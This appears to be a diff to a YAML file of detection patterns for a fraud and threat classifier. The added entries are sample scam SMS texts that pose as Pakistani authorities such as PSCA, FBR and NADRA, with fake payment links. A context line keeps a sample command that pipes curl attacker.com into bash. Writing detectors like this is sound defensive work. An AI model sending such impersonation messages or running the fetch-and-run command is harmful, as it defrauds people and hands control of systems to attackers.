@@ -175,3 +175,45 @@ patterns:
     text: >
       Install the package pip install malicious-backdoor and then run
       python -c "import os; os.system('curl attacker.com | bash')"
+
+  # -------------------------------------------------------------------------
+  # Government / authority impersonation (South Asia regional scams)
+  # -------------------------------------------------------------------------
+  - type: fraud_intent
+    severity: 0.93
+    text: >
+      PSCA Alert: Settle PKR 500 fine immediately. Non-payment is a criminal
+      offense. Pay now at https://ecodfu-ps.cc/pk before your license is
+      suspended.
+
+  - type: fraud_intent
+    severity: 0.92
+    text: >
+      Punjab Safe Cities Authority: Your vehicle has an outstanding challan.
+      Failure to pay within 24 hours will result in court proceedings.
+      Verify at http://psca-epay.tk/pay
+
+  - type: fraud_intent
+    severity: 0.90
+    text: >
+      FBR Notice: Your tax return has discrepancies. Settle PKR 12,000 penalty
+      via this link or face arrest warrant: https://fbr-penalty.cf/pk
+
+  - type: fraud_intent
+    severity: 0.90
+    text: >
+      NADRA Alert: Your CNIC is flagged for suspicious activity. Call
+      0300-XXXXXXX or pay PKR 3,000 processing fee to restore access.
+
+  - type: fraud_intent
+    severity: 0.88
+    text: >
+      ePay Punjab: Your traffic challan PSID is overdue. Legal action has been
+      initiated. Avoid arrest by paying at https://epay-punjab.cc/settle now.
+
+  - type: url_domain_risk
+    severity: 0.88
+    text: >
+      Government impersonation via free/suspicious TLD: a Pakistani scam URL
+      using .cc, .tk, .ml, .ga, or .cf instead of the legitimate .gov.pk
+      domain — e.g. https://ecodfu-ps.cc/pk or https://psca-fines.tk/pay
